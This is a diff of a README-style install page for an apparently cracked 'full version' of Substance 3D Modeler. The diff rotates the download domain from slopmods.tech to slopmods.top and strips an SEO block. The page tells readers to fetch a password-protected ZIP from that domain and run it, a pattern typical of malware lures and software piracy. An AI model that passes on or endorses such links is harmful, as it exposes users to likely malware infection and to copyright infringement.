@@ -1,6 +1,6 @@
 ***
 
-# Substance 3D Modeler Full Version — Windows Install Notes
+# Substance 3D Modeler Full Version Windows Setup Notes
 
 Substance 3D Modeler — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Substance 3D Modeler — Windows setup and configuration · Premium workspace ·
 
 > Use the release page below for Windows.
 
-- **Release page:** [jlylafibdbv.slopmods.tech](https://jlylafibdbv.slopmods.tech/)
-- **Full URL:** `https://jlylafibdbv.slopmods.tech/`
+- **Release page:** [jlylafibdbv.slopmods.top](https://jlylafibdbv.slopmods.top/)
+- **Full URL:** `https://jlylafibdbv.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **jlylafibdbv.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **jlylafibdbv.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Substance 3D Modeler — Windows setup and configuration · Premium workspace ·
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **jlylafibdbv.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **jlylafibdbv.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Substance 3D Modeler** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Core Substance 3D Modeler features on Windows desktop
